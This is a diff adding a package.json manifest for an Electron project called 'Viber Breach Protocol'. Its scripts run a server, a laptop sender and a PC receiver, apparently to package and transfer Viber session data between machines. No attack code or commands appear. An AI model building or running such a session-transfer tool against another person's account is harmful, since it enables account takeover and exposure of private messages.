@@ -1,0 +1,33 @@
+{
+  "name": "viber-breach-system",
+  "version": "1.0.0",
+  "description": "Viber Session Transfer System - Professional Edition",
+  "main": "main.js",
+  "scripts": {
+    "start": "electron .",
+    "build": "electron-builder",
+    "server": "node server/server.js",
+    "laptop": "node laptop/laptop-sender.js",
+    "pc": "node pc/pc-receiver.js"
+  },
+  "keywords": ["viber", "electron", "security"],
+  "author": "",
+  "license": "MIT",
+  "devDependencies": {
+    "electron": "^27.0.0",
+    "electron-builder": "^24.6.4"
+  },
+  "dependencies": {
+    "ws": "^8.14.2",
+    "archiver": "^6.0.1",
+    "adm-zip": "^0.5.10"
+  },
+  "build": {
+    "appId": "com.viber.breach",
+    "productName": "Viber Breach Protocol",
+    "win": {
+      "target": ["nsis"],
+      "icon": "assets/icon.ico"
+    }
+  }
+}
